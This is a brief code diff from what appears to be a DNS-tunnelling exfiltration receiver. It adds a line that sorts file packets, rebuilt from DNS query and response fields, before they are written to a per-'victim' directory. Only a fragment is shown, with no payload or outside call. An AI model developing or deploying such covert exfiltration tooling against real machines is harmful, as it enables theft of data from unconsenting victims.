@@ -158,6 +158,7 @@ class DataReceiver():
             self.file_transfer[key].append(PacketData(dnsqr_layer.qclass, dnsrr_layer.rdata))
 
             # Sort packets since they may be out of order
+            self.file_transfer[key] = sorted(self.file_transfer[key], key=attrgetter('index'))
 
             # Write to file from buffer
             victim_dir = self.rel_path + str(victim_mac)
